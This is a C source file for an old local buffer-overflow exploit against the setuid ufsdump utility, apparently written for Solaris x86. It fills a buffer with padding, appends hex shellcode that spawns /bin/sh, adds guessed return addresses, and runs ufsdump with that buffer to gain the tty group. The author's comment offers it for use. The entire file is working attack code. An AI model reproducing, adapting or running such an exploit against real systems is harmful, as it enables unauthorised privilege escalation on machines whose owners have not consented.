/* ufsdump.c
* Description:  Overflows a buffer to give you EGID=tty.
* At least that's what id reports.
* The running shell thinks its still the user.  Maybe I'm
* doing something wrong?  At any
* rate,  here ya go, have fun.
*
*  smm@wpi.edu
*  Thanks to: Jesse Schachter for the box, and
*  Unknown parties for the shellcode. (probably Aleph1).
*/

#include <stdio.h>
static inline getesp() {
  __asm__(" movl %esp,%eax ");
}
main(int argc, char **argv) {
  int i,j,buffer,offset;
  long unsigned esp;
  char unsigned buf[4096];
  unsigned char
  shellcode[]=
      "\x55\x8b\xec\x83\xec\x08\xeb\x50\x33\xc0\xb0\x3b\xeb\x16\xc3"
        "\x33\xc0\x40\xeb\x10\xc3\x5e\x33\xdb\x89\x5e\x01\xc6\x46\x05"
        "\x07\x88\x7e\x06\xeb\x05\xe8\xec\xff\xff\xff\x9a\xff\xff\xff"
        "\xff\x0f\x0f\xc3\x5e\x33\xc0\x89\x76\x08\x88\x46\x07\x89\x46"
        "\x0c\x50\x8d\x46\x08\x50\x8b\x46\x08\x50\xe8\xbd\xff\xff\xff"
        "\x83\xc4\x0c\x6a\x01\xe8\xba\xff\xff\xff\x83\xc4\x04\xe8\xd4"
        "\xff\xff\xff/bin/sh";
  buffer=895;
  offset=3500;
  if (argc>1)buffer=atoi(argv[1]);
  if (argc>2)offset=atoi(argv[2]);
  for (i=0;i<buffer;i++)
     buf[i]=0x41;  /* inc ecx */
  j=0;
  for (i=buffer;i<buffer+strlen(shellcode);i++)
      buf[i]=shellcode[j++];
  esp=getesp()+offset;
  buf[i]=esp & 0xFF;
  buf[i+1]=(esp >> 8) & 0xFF;
  buf[i+2]=(esp >> 16) & 0xFF;
  buf[i+3]=(esp >> 24) & 0xFF;
  buf[i+4]=esp & 0xFF;
  buf[i+5]=(esp >> 8) & 0xFF;
  buf[i+6]=(esp >> 16) & 0xFF;
  buf[i+7]=(esp >> 24) & 0xFF;
  printf("Offset: 0x%x\n\n",esp);
  execl("/usr/lib/fs/ufs/ufsdump","ufsdump","1",buf,NULL);
}


